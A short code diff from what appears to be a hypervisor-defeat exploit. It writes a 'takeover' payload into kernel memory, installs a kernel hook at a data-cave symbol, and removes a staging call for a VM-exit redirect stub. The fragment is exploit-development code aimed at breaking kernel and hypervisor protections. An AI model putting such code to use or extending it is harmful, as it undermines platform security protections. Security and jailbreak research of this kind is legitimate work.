@@ -951,10 +951,6 @@ int hv_defeat_1360_post_resume(void) {
 
   kwrite(g_payload_va, takeover_bin, takeover_bin_len);
 
-  /* Put the redirect in place ourselves first, so the result can be logged. The
-   * blob writes the same bytes again; that is harmless. */
-  stage_vmexit_stub(kdldmap(0));
-
   ret = kh_init(&hook, by_read, by_write, ktext, kdlsym(KERNEL_SYM_DATA_CAVE),
                 HOOK_IST);
   if (ret) {
